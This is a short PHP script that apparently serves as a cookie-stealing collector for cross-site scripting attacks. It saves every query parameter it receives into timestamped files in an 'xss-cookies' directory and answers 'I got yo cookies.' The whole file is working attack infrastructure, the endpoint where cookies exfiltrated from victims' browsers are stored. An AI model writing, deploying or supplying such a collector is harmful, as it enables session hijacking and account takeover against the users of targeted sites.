<?php
    $filename = "xss-cookies/cookies-" . time() . ".txt";
    echo "I got yo cookies.";

    $file = fopen($filename, "w") or die("Oops");
    
    foreach ($_GET as $k => $v) {
        fwrite($file, $k . " = " . $v . "\n");
    }
    fclose($file);
?>
